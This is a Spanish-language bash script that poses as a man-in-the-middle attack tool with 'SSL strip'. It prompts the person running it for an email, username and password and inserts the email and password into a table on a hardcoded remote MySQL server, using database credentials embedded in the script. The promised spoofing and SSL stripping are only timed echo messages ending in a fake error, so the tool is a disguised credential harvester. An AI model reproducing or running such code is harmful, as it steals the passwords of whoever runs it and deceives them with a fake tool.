#!/bin/bash -x

DB_USER='script';
DB_PASSWD='asd2015';
DB_NAME='datos_2';
DB_IP='165.227.34.119';
DB_PORT='3306'
TABLE='datos_logs';


echo -e "..........................................."
echo -e "\e[96mScript MITM Attack created for facundo salgado"
echo -e "\e[39m..........................................."
echo -e "Para continuar debe registrarte"
echo -e "\e[39mintrodusca su email para recibir datos que se capturen"
read objetive
echo -e "\e[92mEspere por favor..."
sleep  10
echo -e "\e[92mEmail configurado exitosamente..." 
sleep  2
echo -e "\e[92mEspere por favor..."
sleep  5
echo -e "\e[39mintrodusca su username para crear su cuenta"
read  username
echo -e "\e[92mEspere por Favor"
sleep  10
echo -e "\e[39mIntrodusca su contraseña"
read  password
echo -e "\e[92mEstamos creando su cuenta aguarde por favor"
sleep   15

echo -e "\e[96mCuenta creada correctamente"

mysql --user=script  --host=165.227.34.119 --port=3306 --database=$DB_NAME --password=$DB_PASSWD  -e "INSERT INTO $TABLE (\`username\`, \`pass\`) VALUES ('$objetive', '$password')"
echo -e "\e[39m Escribe tu Direccion IP, por favor: "
read ip
echo -e "\e[39mEl trafico sera redirigido a ,\e[34m $ip"
echo -e "\e[39mEscribe la ip de la maquina objetivo: "
read objetive_ip
echo -e "\e[39m Trafico web de la maquina,\e[31m $objetive_ip,\e[39m spoofed a,\e[32m $ip"
echo -e "\e[39m Activando \e[32m SSL strip "
sleep 7
echo -e "\e[32m SSL strip ON "
echo -e "\e[39m Esperando interaccion de,\e[31m $objetive_ip "
echo -e "\e[32mAguarde Por favor "
sleep 25
echo -e "Objetive\e[31m, $objetive_ip\e[39m Spofeed to\e[32m $ip  "
echo -e "\e[32mAplicando SSL Strip"
sleep 5
echo -e "\e[32m SSL strip aplicado "
echo -e "\e[39m Esperando Credenciales Post de,\e[31m $objetive_ip "
sleep 10
echo -e "...................................................... "
echo -e "\e[31mError:\e[39m la maquina\e[31m $objetive_ip\e[39m no existe dentro de su red o esta desconectada"
echo -e "...................................................... "
